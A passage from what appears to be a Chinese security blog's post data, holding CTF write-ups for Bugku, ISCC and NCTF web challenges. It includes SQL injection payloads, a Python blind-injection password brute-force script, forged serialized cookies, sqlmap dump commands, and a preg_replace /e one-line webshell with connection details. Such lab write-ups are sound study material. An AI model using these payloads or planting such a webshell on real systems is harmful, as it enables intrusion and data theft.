?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag2&#x27;),&#x27;~&#x27;),3) %23 table:~flag2,address~ # 查数据 ?id=1&#x27; and updatexml(1,concat(&#x27;0x7e&#x27;,(select flag2 from flag2),&#x27;0x7e&#x27;),3) %23 拿到真正的flag PHP_encrypt_1(ISCCCTF)题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可 加密后的数据为 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= &lt;?php function encrypt($data,$key) &#123; $key = md5(&#x27;ISCC&#x27;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str); &#125; ?&gt; 解密脚本如下 &lt;?php function decode($str) &#123; $key = md5(&#x27;ISCC&#x27;); // 对密钥进行md5加密 $x=0; $str=base64_decode($str); //对加密后的字符串base64解码 $len=strlen($str); $klen=strlen($key); for($i=0;$i&lt;$len;$i++) //计算出char字符数组，用于最后的减操作 &#123; if($x==$klen) &#123; $x=0; &#125; $char.=$key[$x]; $x+=1; &#125; for($i=0;$i&lt;$len;$i++) &#123; $data.=chr((ord($str[$i])-ord($char[$i])+128)%128); //加上128为了防止出现负数。 &#125; return $data; &#125; echo(decode(&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;)); ?&gt; 文件包含2网址打不开 flag.php给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码 &lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie &#x3D; $_COOKIE[&#39;ISecer&#39;]; &#x2F;&#x2F;含cookie 可能需要抓包修改cookie if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag &#123; echo &quot;$flag&quot;; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt; &lt;title&gt;Login&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;br&gt; &lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;?php &#125; $KEY&#x3D;&#39;ISecer:www.isecer.com&#39;; ?&gt; 代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了 直接构造 ISecer=s:21:&quot;ISecer:www.isecer.com&quot;; 但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL 所以真正的payload： ISecer=s:0:&quot;&quot;; 请求头 GET /flagphp/ HTTP/1.1 Host: 123.206.87.240:8002 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 DNT: 1 Cookie: ISecer=s:0:&quot;&quot;; Connection: close sql注入2提示： 全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,% 带有过滤的sql注入 先测试一下过滤哪些字符 测试发现 or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符 测试还可以发现，当uname=admin&amp;passwd=111时提示的password error , 但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。 当uname=admin’-1-‘&amp;passwd=11时为false 当uname=admin’-0-‘&amp;passwd=1时为true 所以猜测sql查询语句为 $sql &#x3D; select * from users where username&#x3D;$username; 尝试构造注入语句ascii(substr((select database(),1,1)))&gt;50 上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置 但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句 ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0 reverse 为字符串反转函数 确定盲注的判断条件 当上面的语句成立时返回的是 username error 不成立时返回的是password error 编写脚本 因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位 import requests url = &quot;http://123.206.87.240:8007/web2/login.php&quot; cookie =&#123;&#x27;PHPSESSID&#x27;:&#x27;r3rln64ialiqjnefpa6qu5a0t513t8rs&#x27;&#125; password = &quot;&quot; for i in range(1,33): for j in &#x27;0123456789abcdef&#x27;: payload = &quot;admin&#x27;-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-&#x27;&quot;.format(i,ord(j)) data=&#123;&#x27;uname&#x27;:payload,&#x27;passwd&#x27;:&quot;111&quot;&#125; res = requests.post(url=url,cookies=cookie,data=data) if &quot;username&quot; in res.text: password +=j #print(password) break print(password) 005b81fd960f61505237dbb7a3202910 md5在线解码后为admin123 登录后即可用ls命令，就可以拿到flag 这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破 参考叶师傅：https://xz.aliyun.com/t/2583 孙xx的博客进入页面是一个博客的页面，有搜索功能，没有思路 于是扫描目录 但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做 Trim的日记本tips:不要一次就放弃 是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法 那就万事不觉扫以下 还真有发现 扫到三个目录 login.php register.php show.php 访问show.php,拿到flag login2(SKCTF) login3 文件上传2 login4题目都挂了 江湖魔头提示:学会如来神掌就可以打败他了吧 进入题目发现还真像是游戏的界面 包含属性 练功 商店 赚钱 讨伐 退出 几个页面 其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag 查看源码 在wulin.php中可以看到三个js文件 //script.js 在线格式化后的结果 eval(function(p, a, c, k, e, r) &#123; e = function(c) &#123; return (c &lt; 62 ? &#x27;&#x27; : e(parseInt(c / 62))) + ((c = c % 62) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36)) &#125;; if (&#x27;0&#x27;.replace(0, e) == 0) &#123; while (c--) r[e(c)] = k[c]; k = [function(e) &#123; return r[e] || e &#125;]; e = function() &#123; return &#x27;[57-9abd-hj-zAB]&#x27; &#125;; c = 1 &#125;; while (c--) if (k[c]) p = p.replace(new RegExp(&#x27;\\\\b&#x27; + e(c) + &#x27;\\\\b&#x27;, &#x27;g&#x27;), k[c]); return p &#125;(&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\\&#x27;;\\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\\&#x27;;\\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\\&#x27;&quot;\\&#x27;,&quot;&quot;).B(\\&#x27;&quot;\\&#x27;,&quot;&quot;);9.write(\\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;, [], 38, &#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;.split(&#x27;|&#x27;), 0, &#123;&#125;)) 可以看到function(p, a, c, k, e, r)函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。 (&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\\&#x27;;\\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\\&#x27;;\\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\\&#x27;&quot;\\&#x27;,&quot;&quot;).B(\\&#x27;&quot;\\&#x27;,&quot;&quot;);9.write(\\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;, [], 38, &#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;.split(&#x27;|&#x27;), 0, &#123;&#125;) 删除eval在浏览器的控制台跑出的结果 在线代码格式化后如下 function getCookie(cname) &#123; var name = cname + &quot;=&quot;; var ca = document.cookie.split(&#x27;;&#x27;); for (var i = 0; i &lt; ca.length; i++) &#123; var c = ca[i].trim(); if (c.indexOf(name) == 0) return c.substring(name.length, c.length) &#125; return &quot;&quot; &#125; function decode_create(temp) &#123; var base = new Base64(); var result = base.decode(temp); var result3 = &quot;&quot;; for (i = 0; i &lt; result.length; i++) &#123; var num = result[i].charCodeAt(); num = num ^ i; num = num - ((i % 10) + 2); result3 += String.fromCharCode(num) &#125; return result3 &#125; function ertqwe() &#123; var temp_name = &quot;user&quot;; var temp = getCookie(temp_name); temp = decodeURIComponent(temp); var mingwen = decode_create(temp); var ca = mingwen.split(&#x27;;&#x27;); var key = &quot;&quot;; for (i = 0; i &lt; ca.length; i++) &#123; if (-1 &lt; ca[i].indexOf(&quot;flag&quot;)) &#123; key = ca[i + 1].split(&quot;:&quot;)[2] &#125; &#125; key = key.replace(&#x27;&quot;&#x27;, &quot;&quot;).replace(&#x27;&quot;&#x27;, &quot;&quot;); document.write(&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-2.jpg&quot; &#125;, 1000); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-3.jpg&quot; &#125;, 2000); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-4.jpg&quot; &#125;, 3000); setTimeout(function () &#123; document.getElementById(&quot;attack-1&quot;).src = &quot;image/6.png&quot; &#125;, 4000); setTimeout(function () &#123; alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot; + md5(key) + &quot;&#125;&quot;) //发现了flag字段 &#125;, 5000) &#125; 首先在控制台中获取cookie getCookie(&quot;user&quot;); 获取cookie，使用上面的js代码一步一步解码 最后会获取序列化后的一串字符串 最后解出来的cookie值 O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:615;s:5:&quot;neili&quot;;i:657;s:5:&quot;lidao&quot;;i:76;s:6:&quot;dingli&quot;;i:72;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:0;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125; 但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag 改cookie的方法就是将明文逆向编码： 刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。猜想一定是base64.js有问题： 发现加密过程并不对应，encode调用了_utf8_encode但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改 修改后的反编码过程，将其放到html文件中，浏览器运行即可出结果 //1.html &lt;script&gt; function Base64() &#123; // private property _keyStr = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;; // public method for encoding this.encode = function (input) &#123; var output = &quot;&quot;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; //input = _utf8_encode(input); (注释掉这个函数调用) while (i &lt; input.length) &#123; chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 &gt;&gt; 2; enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4); enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6); enc4 = chr3 &amp; 63; if (isNaN(chr2)) &#123; enc3 = enc4 = 64; &#125; else if (isNaN(chr3)) &#123; enc4 = 64; &#125; output = output + _keyStr.charAt(enc1) + _keyStr.charAt(enc2) + _keyStr.charAt(enc3) + _keyStr.charAt(enc4); &#125; return output; &#125; // public method for decoding this.decode = function (input) &#123; var output = &quot;&quot;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, &quot;&quot;); while (i &lt; input.length) &#123; enc1 = _keyStr.indexOf(input.charAt(i++)); enc2 = _keyStr.indexOf(input.charAt(i++)); enc3 = _keyStr.indexOf(input.charAt(i++)); enc4 = _keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4); chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2); chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) &#123; output = output + String.fromCharCode(chr2); &#125; if (enc4 != 64) &#123; output = output + String.fromCharCode(chr3); &#125; &#125; //output = _utf8_decode(output); return output; &#125; // private method for UTF-8 encoding _utf8_encode = function (string) &#123; string = string.replace(/\\r\\n/g,&quot;\\n&quot;); var utftext = &quot;&quot;; for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; utftext += String.fromCharCode(c); &#125; else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; utftext += String.fromCharCode((c &gt;&gt; 6) | 192); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; else &#123; utftext += String.fromCharCode((c &gt;&gt; 12) | 224); utftext += String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; &#125; return utftext; &#125; // private method for UTF-8 decoding _utf8_decode = function (utftext) &#123; var string = &quot;&quot;; var i = 0; var c = c1 = c2 = 0; while ( i &lt; utftext.length ) &#123; c = utftext.charCodeAt(i); if (c &lt; 128) &#123; string += String.fromCharCode(c); i++; &#125; else if((c &gt; 191) &amp;&amp; (c &lt; 224)) &#123; c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c &amp; 31) &lt;&lt; 6) | (c2 &amp; 63)); i += 2; &#125; else &#123; c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63)); i += 3; &#125; &#125; return string; &#125; &#125; //原来cookie var temp = &quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;; //进行加密，获取明文 var base = new Base64(); var result = base.decode(temp); var result3 = &quot;&quot;; for (i = 0; i &lt; result.length; i++) &#123; var num = result[i].charCodeAt(); num = num ^ i; num = num - ((i % 10) + 2); result3 += String.fromCharCode(num); &#125; document.write(&quot;原明文：&quot;+result3+&#x27;&lt;br/&gt;&#x27;); document.write(&#x27;&lt;br/&gt;&#x27;); var result3 = &#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;; //反编码获取cookie var result = &quot;&quot;; for (i = 0;i&lt;result3.length;i++)&#123; num = result3[i].charCodeAt(); num = num + ((i % 10) + 2); num = num ^ i; result += String.fromCharCode(num); &#125; var temp= base.encode(result); //将cookie进行url编码 temp = encodeURIComponent(temp); document.write(&quot;cookie:&quot;+temp+&quot;&lt;/br&gt;&quot;); &lt;/script&gt; 编码结果 UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo%2FBTzBxKbu6fbrB%2BH%2Bps3nsLrP6dCs0LgR8fj1%2F%2B6y3%2B%2FapJ3XnJnkjNPf0NnRjpPD7paIiIiIhovBiIL4kNTK0dea%2F7mC%2B4bu%2FOr1SQ%3D%3D 这就是我们期待的cookie,然后用工具修改cookie 修满属性值打怪拿到flag 参考 这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。","tags":[{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://sunzhengyu99.github.io/tags/cookie/"},{"name":"编码","slug":"编码","permalink":"https://sunzhengyu99.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"综合2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/综合2/","text":"NCTF-综合2 进入页面，没什么特别的地方，随便点点 留言可以正常提交，本以为有xss,但是已经提示不是xss 看到最下面有个网站说明 本CMS说明 ，有用的内容如下 config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索 admin表结构 create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txt可以使用php伪协议任意读取文件内容。 包括自己 尝试读取index.php的源码，发现好像并没有什么用 读取about.php &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;?php $file&#x3D;$_GET[&#39;file&#39;]; if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; 有config.php echo &quot;file参数不能为空！&quot;; exit(); &#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;包含了 loginxlcteam页面 if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;; &#125; &#125; 读取config.php，无有用信息 查看loginxlcteam,是个登录页面 到此还是无从下手，参考大佬的博客 https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase 在搜索页面中也存在有用信息 http://cms.nuptzj.cn/about.php?file=so.php获取源码 &lt;?php //so.php if($_SERVER[&#x27;HTTP_USER_AGENT&#x27;]!=&quot;Xlcteam Browser&quot;)&#123; //必须修改http头，吧user-agent改成Xlcteam Browser echo &#x27;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&#x27;; exit(); &#125; $id=$_POST[&#x27;soid&#x27;]; //post 一个soid include &#x27;config.php&#x27;; include &#x27;antiinject.php&#x27;; //防注入的文件 include &#x27;antixss.php&#x27;; //防xss的文件 $id=antiinject($id); //对id过滤 $con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error()); mysql_select_db($db_name,$con); $id=mysql_real_escape_string($id); $result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;); //sql查询，可能存在注入点 $rs=mysql_fetch_array($result); echo htmlspecialchars($rs[&#x27;nice&#x27;]).&#x27;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;.antixss($rs[&#x27;say&#x27;]).&#x27;&lt;br /&gt;&#x27;; mysql_free_result($result); mysql_free_result($file); mysql_close($con); ?&gt; &lt;?php //antiinject.php源码 function antiinject($content) &#123; $keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&#x27; &#x27;,&quot;&#x27;&quot;,&quot;;&quot;,&#x27;&quot;&#x27;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;); //对一些sql注入时用到的关键词进行了过滤 $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], &#x27;&#x27;,$info); &#125; return $info; &#125; ?&gt; 大致意思就是 1.判断http请求头中的user-agent参数是否为Xlcteam Browser 2.post参数soid 3.对soid进行过滤后带入sql语句中查询 于是抓包修改user-agent 确定存在注入点 由于之前提示了admin表结构 create table admin ( id integer, username text, userpass text, ) 可直接写出查询语句 (sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCII码转字符串结果为： fuckruntu 登录 http://cms.nuptzj.cn/about.php?file=xlcteam.php 查看源码 &lt;?php $e = $_REQUEST[&#x27;www&#x27;]; $arr = array($_POST[&#x27;wtf&#x27;] =&gt; &#x27;|.*|e&#x27;,); array_walk($arr, $e, &#x27;&#x27;); ?&gt; 看样子是可以用菜刀连接的 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：参考https://www.jb51.net/article/38714.htm简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。用菜刀连接： url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace 密码：wtf 总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugku刷题 成绩单1&#x27; and 1=1 # 1&#x27; and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4#可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) sqlmap 因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中 1.获取数据库python2 sqlmap.py -r a.txt --dbs 2.获取表名python2 sqlmap.py -r a.txt -D skctf_flag --tables 3.获取列名python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.获取flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump 备份是个好习惯 扫描发现了index.php，通过 index.php.bak下载网页源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;); $str = substr($str,1); $str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str); parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;; &#125; ?&gt; 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 多次爆数据库名 http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+ database:web1002-1 爆表名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint 爆字段名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,address获取内容 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 提交发现不对 